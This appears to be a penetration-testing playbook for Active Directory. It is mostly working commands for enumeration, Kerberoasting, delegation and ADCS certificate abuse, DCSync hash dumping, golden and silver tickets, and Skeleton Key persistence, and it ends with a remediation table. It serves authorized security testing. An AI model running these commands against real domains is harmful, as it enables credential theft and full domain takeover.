---
name: performing-active-directory-penetration-test
description: Conduct a focused Active Directory penetration test to enumerate domain objects, discover attack paths with BloodHound, exploit Kerberos weaknesses, escalate privileges via ADCS/DCSync, and demonstrate domain compromise.
domain: cybersecurity
subdomain: penetration-testing
tags: [active-directory, BloodHound, Kerberoasting, Impacket, DCSync, ADCS, domain-compromise, privilege-escalation]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Performing Active Directory Penetration Test

## Overview

Active Directory (AD) penetration testing targets the central identity and access management system used by over 95% of Fortune 500 companies. The test identifies misconfigurations, weak credentials, dangerous delegation settings, vulnerable certificate templates, and attack paths that enable an attacker to escalate from a standard domain user to Domain Admin or Enterprise Admin.

## Prerequisites

- Standard domain user credentials (minimum starting point)
- Network access to domain controllers (LDAP/389, Kerberos/88, SMB/445, DNS/53)
- Tools: BloodHound, Impacket, Certipy, Rubeus, NetExec, Mimikatz
- Kali Linux or Windows attack machine with domain access

## Phase 1 — AD Enumeration

### Domain Information Gathering

```bash
# Basic domain enumeration
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' -d corp.local --groups
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' -d corp.local --users

# LDAP enumeration — domain controllers
ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "OU=Domain Controllers,DC=corp,DC=local" "(objectClass=computer)" dNSHostName

# Enumerate trust relationships
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --trusts

# Enumerate domain password policy
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --pass-pol

# Enumerate Group Policy Objects
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --gpp-passwords

# Find computers with unconstrained delegation
ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "DC=corp,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  dNSHostName

# Find users with constrained delegation
ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "DC=corp,DC=local" "(&(objectCategory=user)(msds-allowedtodelegateto=*))" \
  sAMAccountName msds-allowedtodelegateto

# Enumerate LAPS
netexec ldap 10.0.0.5 -u 'testuser' -p 'Password123' -d corp.local -M laps
```

### BloodHound Attack Path Analysis

```bash
# Collect all BloodHound data
bloodhound-python -u 'testuser' -p 'Password123' -d corp.local \
  -ns 10.0.0.5 -c all --zip

# Alternative: SharpHound from Windows
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Start BloodHound
sudo neo4j start
bloodhound --no-sandbox

# Key Cypher queries in BloodHound:
# - Shortest path to Domain Admin
# - Find Kerberoastable users
# - Find AS-REP Roastable users
# - Find users with DCSync rights
# - Find shortest path from owned principals
# - Find computers where Domain Users are local admin
```

### Service Account Discovery

```bash
# Find service accounts with SPNs (Kerberoastable)
impacket-GetUserSPNs 'corp.local/testuser:Password123' -dc-ip 10.0.0.5

# Find accounts without Kerberos pre-authentication
impacket-GetNPUsers 'corp.local/' -usersfile domain_users.txt \
  -dc-ip 10.0.0.5 -format hashcat

# Find managed service accounts
ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "DC=corp,DC=local" "(objectClass=msDS-GroupManagedServiceAccount)" \
  sAMAccountName msDS-GroupMSAMembership
```

## Phase 2 — Kerberos Attacks

### Kerberoasting

```bash
# Extract TGS tickets for service accounts
impacket-GetUserSPNs 'corp.local/testuser:Password123' -dc-ip 10.0.0.5 \
  -outputfile kerberoast.txt -request

# Crack with Hashcat (mode 13100 for Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force

# Targeted Kerberoasting with Rubeus (Windows)
.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql_tgs.txt
```

### AS-REP Roasting

```bash
# Target accounts without pre-authentication
impacket-GetNPUsers 'corp.local/' -usersfile users.txt -dc-ip 10.0.0.5 \
  -outputfile asrep.txt -format hashcat

# Crack AS-REP hashes (mode 18200)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Kerberos Delegation Attacks

```bash
# Unconstrained delegation — extract TGTs from memory
# If you compromise a host with unconstrained delegation:
.\Rubeus.exe monitor /interval:5 /nowrap
# Force authentication from DC using PrinterBug/SpoolSample
.\SpoolSample.exe DC01.corp.local YOURHOST.corp.local
.\Rubeus.exe ptt /ticket:<base64_ticket>

# Constrained delegation — S4U abuse
impacket-getST 'corp.local/svc_web:WebPass123' -spn 'CIFS/fileserver.corp.local' \
  -dc-ip 10.0.0.5 -impersonate administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec 'corp.local/administrator@fileserver.corp.local' -k -no-pass

# Resource-Based Constrained Delegation (RBCD)
impacket-addcomputer 'corp.local/testuser:Password123' -computer-name 'EVIL$' \
  -computer-pass 'EvilPass123' -dc-ip 10.0.0.5
python3 rbcd.py -delegate-to 'TARGET$' -delegate-from 'EVIL$' \
  -dc-ip 10.0.0.5 'corp.local/testuser:Password123'
impacket-getST 'corp.local/EVIL$:EvilPass123' -spn 'CIFS/target.corp.local' \
  -impersonate administrator -dc-ip 10.0.0.5
```

## Phase 3 — ADCS (Active Directory Certificate Services) Attacks

```bash
# Enumerate ADCS with Certipy
certipy find -u 'testuser@corp.local' -p 'Password123' -dc-ip 10.0.0.5 \
  -vulnerable -stdout

# ESC1 — Vulnerable certificate template (enrollee can specify SAN)
certipy req -u 'testuser@corp.local' -p 'Password123' \
  -target ca.corp.local -ca CORP-CA \
  -template VulnerableWebServer -upn administrator@corp.local

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.5

# ESC4 — Template ACL misconfiguration
# Modify template to enable ESC1 conditions, then exploit as above

# ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
certipy req -u 'testuser@corp.local' -p 'Password123' \
  -target ca.corp.local -ca CORP-CA \
  -template User -upn administrator@corp.local

# ESC8 — NTLM relay to HTTP enrollment endpoint
certipy relay -target 'http://ca.corp.local/certsrv/certfnsh.asp' \
  -template DomainController
```

## Phase 4 — Domain Privilege Escalation

### DCSync Attack

```bash
# DCSync — extract all domain hashes (requires replication rights)
impacket-secretsdump 'corp.local/domainadmin:DAPass@10.0.0.5' -just-dc

# DCSync specific user
impacket-secretsdump 'corp.local/domainadmin:DAPass@10.0.0.5' \
  -just-dc-user krbtgt

# With Mimikatz (Windows)
mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt
```

### Golden Ticket

```bash
# Create Golden Ticket (requires krbtgt hash and domain SID)
impacket-ticketer -nthash <krbtgt_nthash> -domain-sid S-1-5-21-... \
  -domain corp.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec 'corp.local/administrator@dc01.corp.local' -k -no-pass

# With Mimikatz
mimikatz# kerberos::golden /user:administrator /domain:corp.local \
  /sid:S-1-5-21-... /krbtgt:<hash> /ptt
```

### Silver Ticket

```bash
# Create Silver Ticket for specific service
impacket-ticketer -nthash <service_nthash> -domain-sid S-1-5-21-... \
  -domain corp.local -spn MSSQL/sqlserver.corp.local administrator

export KRB5CCNAME=administrator.ccache
impacket-mssqlclient 'corp.local/administrator@sqlserver.corp.local' -k -no-pass
```

## Phase 5 — Persistence Demonstration

```bash
# Skeleton Key (inject into LSASS — authorized testing only)
mimikatz# privilege::debug
mimikatz# misc::skeleton
# Now any user can authenticate with "mimikatz" as password

# AdminSDHolder persistence
# Add controlled user to AdminSDHolder ACL
# SDProp process propagates ACL to all protected groups every 60 minutes

# SID History injection
# Inject Domain Admin SID into low-privilege user's SID history

# Document all persistence mechanisms and clean up after testing
```

## Findings and Remediation

| Finding | CVSS | Remediation |
|---------|------|-------------|
| Kerberoastable accounts with weak passwords | 7.5 | Use gMSA, enforce 25+ char passwords for service accounts |
| Unconstrained delegation on servers | 8.1 | Remove unconstrained delegation, use constrained or RBCD |
| Vulnerable ADCS templates (ESC1-ESC8) | 9.8 | Audit templates, remove dangerous permissions, require approval |
| DCSync permissions on non-DA accounts | 9.8 | Audit replication rights, implement tiered admin model |
| LLMNR/NBT-NS enabled | 8.1 | Disable via GPO |
| No LAPS deployed | 7.2 | Deploy Windows LAPS for local admin management |
| Weak domain password policy | 6.5 | Enforce 14+ chars, implement fine-grained password policies |

## References

- BloodHound: https://github.com/BloodHoundAD/BloodHound
- Impacket: https://github.com/fortra/impacket
- Certipy: https://github.com/ly4k/Certipy
- HackTricks AD: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html
- SpecterOps AD Security: https://specterops.io/blog/
- MITRE ATT&CK: https://attack.mitre.org/
